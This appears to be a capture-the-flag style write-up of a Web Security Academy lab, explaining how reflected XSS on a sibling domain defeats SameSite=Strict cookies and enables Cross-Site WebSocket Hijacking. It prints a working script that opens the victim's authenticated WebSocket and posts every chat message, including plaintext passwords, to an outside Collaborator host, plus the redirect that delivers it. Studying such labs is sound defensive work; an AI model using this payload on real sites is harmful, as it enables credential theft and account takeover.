# CSRF – SameSite Strict Bypass via Sibling Domain (CSWSH)

(**Web Security Academy**)

This lab demonstrates how **SameSite=Strict cookies can be bypassed** by abusing a **sibling domain vulnerability**, allowing a **Cross-Site WebSocket Hijacking (CSWSH)** attack that results in **credential disclosure and account takeover**.

---

## Lab: SameSite Strict Bypass via Sibling Domain

**Category:** Cross-Site Request Forgery / WebSocket Security (CSRF + CSWSH)
**Protection Mechanism:** SameSite=Strict cookies
**Difficulty:** Practitioner
**Tools Used:** Burp Suite Community Edition, Burp Collaborator
**Status:** Solved

---

## What This Lab Is About

The application attempts to protect authenticated functionality by setting session cookies with:

```
SameSite=Strict
```

This prevents cookies from being included in **cross-site requests**, including WebSocket connections.

However, the application also exposes:

* A **live chat WebSocket** with no CSRF-style protection
* A **reflected XSS vulnerability** on a **sibling domain**
* Both domains are part of the **same site**

By chaining these weaknesses, an attacker can:

* Execute JavaScript in a same-site context
* Hijack an authenticated WebSocket connection
* Exfiltrate the victim’s chat history
* Steal credentials sent in plaintext
* Log in as the victim

---

## Target Functionality

**Vulnerable component:**

```
GET /chat   (WebSocket endpoint)
```

**Sensitive data exposed:**

* Full chat history
* Usernames and passwords sent in chat

---

## Key Observations

### 1. SameSite=Strict Is Enabled

From the login response:

```
Set-Cookie: session=...; SameSite=Strict
```

This blocks cookies from being sent in **direct cross-site requests**, including WebSockets initiated from external origins.

---

### 2. WebSocket Chat Leaks Sensitive Data

When the chat page loads or refreshes, the browser sends:

```
READY
```

The server responds with the **entire chat history**, without verifying request origin or intent.

---

### 3. Cross-Site WebSocket Hijacking Is Possible

A malicious script can open a WebSocket connection to:

```
wss://YOUR-LAB-ID.web-security-academy.net/chat
```

and receive chat data — **if cookies are included**.

SameSite=Strict initially prevents this.

---

## Identifying the SameSite Bypass Vector

### 4. Discovery of a Sibling Domain

While reviewing responses for static resources, the following header appears:

```
Access-Control-Allow-Origin: https://cms-YOUR-LAB-ID.web-security-academy.net
```

This reveals a **sibling domain**:

```
https://cms-YOUR-LAB-ID.web-security-academy.net
```

Although the origin differs, it belongs to the **same site**, which is crucial for SameSite behavior.

---

### 5. Reflected XSS on the Sibling Domain

Visiting the sibling domain reveals a login form.

Submitting the following username:

```html
<script>alert(1)</script>
```

Triggers JavaScript execution.

Reflected XSS confirmed.

---

### 6. XSS Is Triggerable via GET Request

By converting the `/login` request to a GET request in Burp Repeater, the XSS still executes.

This allows JavaScript execution **via a single crafted URL**, without user interaction.

---

## Why This Bypasses SameSite=Strict

* Script executes on a **same-site sibling domain**
* Browser treats requests as **same-site**
* Session cookies are included
* WebSocket authentication succeeds
* SameSite=Strict protections are bypassed

---

## CSWSH Exploit Payload

The following script hijacks the authenticated WebSocket connection and exfiltrates chat messages using Burp Collaborator.

```html
<script>
var ws = new WebSocket("wss://YOUR-LAB-ID.web-security-academy.net/chat");
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch("https://YOUR-COLLABORATOR.oastify.com", {
        method: "POST",
        mode: "no-cors",
        body: event.data
    });
};
</script>
```

This payload must be **URL-encoded** and injected via the vulnerable sibling-domain login endpoint.

---

## Final Exploit (Hosted on Exploit Server)

```html
<script>
document.location =
"https://cms-YOUR-LAB-ID.web-security-academy.net/login" +
"?username=URL_ENCODED_CSWSH_PAYLOAD" +
"&password=anything";
</script>
```

---

## Attack Flow

1. Victim is logged in to the main site
2. Victim visits attacker-controlled exploit page
3. Browser navigates to sibling domain
4. Reflected XSS executes attacker JavaScript
5. Script opens authenticated WebSocket connection
6. Chat history is sent by server
7. Messages are exfiltrated via Burp Collaborator
8. Credentials are extracted from chat logs
9. Attacker logs in as the victim

---

## Verification & Delivery

* Stored exploit on exploit server
* Used **View exploit** to test locally
* Verified WebSocket traffic in Collaborator
* Delivered exploit to victim
* Captured victim’s chat history
* Retrieved login credentials
* Logged in as victim
* Lab marked as **Solved**

---

## Impact

An attacker can:

* Bypass SameSite=Strict cookie protections
* Hijack authenticated WebSocket connections
* Steal sensitive chat data
* Obtain plaintext credentials
* Fully compromise user accounts

**Severity:** High

---

## Key Lessons Learned

* SameSite=Strict is **not sufficient on its own**
* Sibling domains share SameSite context
* WebSockets need explicit authentication controls
* XSS can completely negate cookie protections
* Defense-in-depth is mandatory

---

## Defensive Takeaways

To prevent this vulnerability:

* Protect WebSockets with CSRF-style tokens
* Never trust SameSite cookies alone
* Eliminate XSS on all sibling domains
* Avoid sending sensitive data over WebSockets
* Treat same-site ≠ safe-site

---

## Final Summary

* SameSite=Strict cookies were enabled
* WebSocket endpoint trusted cookies alone
* Sibling domain exposed reflected XSS
* XSS executed in same-site context
* Authenticated WebSocket hijacked
* Chat history and credentials leaked
* Victim account compromised
* Lab solved using Burp Suite Community Edition

 
